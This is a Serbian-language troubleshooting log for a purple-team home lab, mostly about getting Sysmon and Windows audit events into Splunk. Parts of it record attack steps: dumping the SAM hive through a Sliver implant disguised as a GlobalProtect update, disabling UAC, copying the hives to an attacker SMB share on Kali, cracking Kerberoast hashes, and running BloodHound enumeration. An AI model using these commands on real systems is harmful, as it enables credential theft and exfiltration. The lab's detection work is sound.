# Purple Team Home Lab — Issues & Solutions

**Dokumentovani problemi tokom setup-a i probe**  
Ovo je odličan CV materijal — pokazuje troubleshooting sposobnosti u enterprise okruženju.

---

## ISSUE #1 — Sysmon EC3 nije stizao u Splunk

**Simptom:** `EventCode=3` upiti vraćaju prazno iako Sysmon generiše evente lokalno.

**Root cause:** Dva odvojena problema:
1. `inputs.conf` u `etc\system\local` nedostaju `start_from = oldest` i `current_only = 0`
2. `etc\apps\SplunkUniversalForwarder\local\inputs.conf` override-uje system config ali nema Sysmon stanza

**Fix:**
```powershell
# Dodaj u system\local\inputs.conf za Sysmon stanza
$content = Get-Content "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf"
$content = $content -replace "\[WinEventLog://Microsoft-Windows-Sysmon/Operational\]", "[WinEventLog://Microsoft-Windows-Sysmon/Operational]`nstart_from = oldest`ncurrent_only = 0`ncheckpointInterval = 5"
Set-Content "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf" $content
```

**Dodaj Sysmon u app inputs.conf:**
```powershell
Add-Content "C:\Program Files\SplunkUniversalForwarder\etc\apps\SplunkUniversalForwarder\local\inputs.conf" "`n[WinEventLog://Microsoft-Windows-Sysmon/Operational]`ndisabled = 0`nindex = main`nsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational"
```

**Restart:**
```powershell
Restart-Service SplunkForwarder
```

**Lesson learned:** Splunk forwarder app configs imaju prioritet nad system configs. Uvek proveravaj oba mesta.

---

## ISSUE #2 — Sysmon log ACL — forwarder nema pristup

**Simptom:** Forwarder se pokreće ali ne čita Sysmon log. Nema Sysmon grešaka u splunkd.log.

**Root cause:** `channelAccess` na Sysmon Operational logu ne uključuje Network Service (`NS`) SID koji Splunk forwarder koristi.

**Dijagnoza:**
```cmd
wevtutil.exe gl "Microsoft-Windows-Sysmon/Operational"
# Proveri channelAccess — ne sme da nedostaje (A;;0x1;;;NS)
```

**Fix:**
```cmd
wevtutil.exe sl "Microsoft-Windows-Sysmon/Operational" /ca:O:BAG:SYD:(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x1;;;BO)(A;;0x1;;;SO)(A;;0x1;;;S-1-5-32-573)(A;;0x1;;;NS)
```

**Lesson learned:** Sysmon log ima custom channelAccess. Kada se Sysmon reinstalira ili restartuje, ACL se može resetovati. Dodati ovu komandu u pre-flight checklist.

---

## ISSUE #3 — EC4769 (Kerberoasting) ne loguje se

**Simptom:** Kerberoasting je izvršen ali Splunk ne prima EC4769. Lokalni auditpol pokazuje "No Auditing" čak i nakon `auditpol /set`.

**Root cause:** Group Policy override-uje lokalni auditpol. Na Domain Controller-u, `Default Domain Controllers Policy` kontroliše audit settings. Lokalni `auditpol /set` nema efekta.

**Fix — na HYDRA-DC:**
```
gpmc.msc → Forest → Domains → MARVEL.local → Domain Controllers → 
Default Domain Controllers Policy → Edit →
Computer Configuration → Policies → Windows Settings → Security Settings →
Advanced Audit Policy Configuration → Audit Policies → Account Logon →
Audit Kerberos Service Ticket Operations → Success and Failure
```

**Verifikacija:**
```cmd
gpupdate /force
auditpol /get /subcategory:"Kerberos Service Ticket Operations"
# Mora da prikazuje: Success and Failure
```

**Lesson learned:** Na domain-joined mašinama, uvek konfiguriši audit policy kroz GPO, ne lokalno. Lokalni auditpol se ignoriše kada postoji GPO setting.

---

## ISSUE #4 — EC4698 (Scheduled Task) ne loguje se

**Simptom:** Scheduled task je kreiran ali nema EC4698 u Splunk-u. `auditpol /get` pokazuje "No Auditing" za "Other Object Access Events" čak i posle lokalnog seta.

**Root cause:** Isti problem kao Issue #3 — GPO override. Za endpoint mašine, `Default Domain Policy` kontroliše audit settings.

**Fix — na HYDRA-DC:**
```
gpmc.msc → Default Domain Policy → Edit →
Computer Configuration → Policies → Windows Settings → Security Settings →
Advanced Audit Policy Configuration → Audit Policies → Object Access →
Audit Other Object Access Events → Success and Failure
```

**Dok si tu, postavi i ostale Object Access kategorije:**
- Audit File System → S&F
- Audit Registry → S&F
- Audit SAM → S&F
- Audit Handle Manipulation → S&F

**Na endpointu:**
```cmd
gpupdate /force
auditpol /get /subcategory:"Other Object Access Events"
```

**Lesson learned:** Scheduled Task audit (EC4698) zahteva "Other Object Access Events" kroz GPO na svim mašinama, ne samo na DC-u.

---

## ISSUE #5 — reg save Access Denied kroz Sliver shell

**Simptom:** `reg save HKLM\SAM` vraća "Access Denied" čak i kada je korisnik u Administrators grupi.

**Root cause:** UAC (User Account Control) je uključen. Čak i Administrator korisnici dobijaju split token — standardni token za normalne operacije, elevated token samo kada eksplicitno prihvate UAC prompt. Sliver shell inheruje non-elevated token.

**Privremeni fix za lab — isključi UAC na THEPUNISHER:**
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
# Reboot
```

**Alternativa bez UAC disable — pokretanje implanta kao elevated:**
- Desni klik na GlobalProtect_Update.exe → Run as Administrator
- Nova Sliver sesija će imati elevated token

**Verifikacija:**
```cmd
whoami /priv | findstr SeBackupPrivilege
# Mora da prikazuje SeBackupPrivilege (Disabled je ok — reg save će ga aktivirati)
```

**Lesson learned:** U realnom enterprise-u UAC bypass je posebna tehnika (T1548.002). Za lab demo, isključujemo UAC da fokusiramo narativ na credential dumping, ne na UAC bypass.

---

## ISSUE #6 — SMB share Access Denied pri kopiranju hive fajlova

**Simptom:** `copy C:\Temp\sam.hive \\192.168.182.133\share\sam.hive` vraća "Access Denied" ili "Network path not found".

**Root cause:** impacket-smbserver bez autentifikacije zahteva da Windows mašina može da se autentifikuje anonimno. Novije verzije Windows-a blokiraju ovo.

**Fix — pokretanje sa kredencijalima:**
```bash
# Kali — ubij stari share
sudo kill -9 $(sudo lsof -t -i:445)

# Kreiraj direktorijum sa permisijama
mkdir -p /tmp/share
chmod 777 /tmp/share

# Pokreni sa autentifikacijom
sudo impacket-smbserver share /tmp/share -smb2support -username kali -password kali
```

**Na THEPUNISHER — autentifikacija pre kopiranja:**
```cmd
net use \\192.168.182.133\share /user:kali kali
copy C:\Temp\sam.hive \\192.168.182.133\share\sam.hive
```

**Lesson learned:** Uvek pokretati impacket-smbserver sa `-username` i `-password`. Anonimni SMB share ne radi pouzdano sa modernim Windows verzijama.

---

## ISSUE #7 — Hashcat memory error na Kali VM

**Simptom:** Hashcat pada sa "Not enough allocatable device memory" na Kali VM sa 1GB RAM.

**Root cause:** Kali VM ima samo 1GB RAM. Hashcat za mode 13100 (Kerberos TGS) zahteva minimum ~512MB allocatable memory za dictionary attack sa rockyou.txt.

**Fix opcija 1 — povećati RAM Kali VM na 2GB** (preporučeno)

**Fix opcija 2 — koristiti John the Ripper:**
```bash
john /tmp/kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

**Fix opcija 3 — hashcat sa -O flagom (optimized kernels):**
```bash
hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force -O
```

**Lesson learned:** Kali VM treba minimum 2GB RAM za hashcat. John je alternativa sa mnogo manjim footprint-om.

---

## ISSUE #8 — Sysmon config nije primenjivan — schema version mismatch

**Simptom:** `sysmon64 -c config.xml` daje grešku ili ne primenjuje nova pravila.

**Root cause:** Config fajl koristi schema version 4.50 ali instaliran Sysmon je verzija 15.15 (schema 4.90). Ovo nije fatalna greška ali može da izazove neočekivano ponašanje.

**Provera:**
```cmd
sysmon64 -c
# Prikazuje trenutnu konfiguraciju i schema version
```

**Rešenje:** Config sa schema 4.50 radi na Sysmon 15.15 uz upozorenje. Za produkciju — ažurirati config na noviju schema verziju.

---

## ISSUE #9 — Splunk restart kao pogrešan korisnik

**Simptom:** `/opt/splunk/bin/splunk restart` vraća "Failed to run splunk as SPLUNK_OS_USER."

**Root cause:** Splunk je konfigurisan da se pokreće kao određeni OS korisnik. Pokretanje kao drugi korisnik nije dozvoljeno.

**Fix:**
```bash
sudo /opt/splunk/bin/splunk restart
# ili
sudo -u splunk /opt/splunk/bin/splunk restart
```

---

## ISSUE #10 — Timestamp problem posle VM pause/resume

**Simptom:** Splunk eventi imaju pogrešan timestamp posle pause/resume VM-a. Eventi mogu biti sat ili više unapred/unazad.

**Root cause:** VM sat se desinhronizuje pri pause/resume. Windows Time Service (W32tm) ne resinhronizuje automatski brzo dovoljno.

**Fix — na svim Windows mašinama:**
```powershell
w32tm /resync /force
```

**Fix — Splunk props.conf (za Sysmon):**
```ini
[WinEventLog:Microsoft-Windows-Sysmon/Operational]
DATETIME_CONFIG = CURRENT
MAX_TIMESTAMP_LOOKAHEAD = 128
```

**Lesson learned:** Uvek pokrenuti `w32tm /resync /force` pre snimanja. Dodati u pre-flight checklist.

---

## ISSUE #11 — BloodHound koristi IPv6 za LDAP konekciju

**Simptom:** BloodHound-python se konektuje na IPv6 adresu umesto IPv4, može izazvati timeout u nekim konfiguracijama.

**Simptom u outputu:**
```
INFO: Testing resolved hostname connectivity fd15:4ba5:5a2b:1008:...
INFO: Trying LDAP connection to fd15:4ba5:5a2b:...
```

**Root cause:** DNS resolve vraća i IPv6 adresu za HYDRA-DC. Python preferuje IPv6.

**Workaround:** Eksplicitno navedi IPv4 sa `-ns` parametrom (već urađeno):
```bash
bloodhound-python -c All -u fcastle -p Password1 -d MARVEL.LOCAL -ns 192.168.182.135
```

**Status:** Radi i pored IPv6 konekcije — enum je uspešan.

---

## SUMMARY — Kritični koraci pre snimanja

| Korak | Mašina | Komanda |
|-------|--------|---------|
| Sysmon inputs.conf fix | Sve Windows | `start_from = oldest`, `current_only = 0` |
| Sysmon ACL fix | Sve Windows | `wevtutil.exe sl ... /ca:...NS)` |
| Kerberos audit GPO | HYDRA-DC | Default Domain Controllers Policy |
| Object Access audit GPO | HYDRA-DC | Default Domain Policy |
| UAC disable | THEPUNISHER | `EnableLUA = 0` + reboot |
| SMB share sa auth | Kali | `-username kali -password kali` |
| Kali RAM | VMware | Minimum 2GB |
| Timestamp sync | Sve Windows | `w32tm /resync /force` |
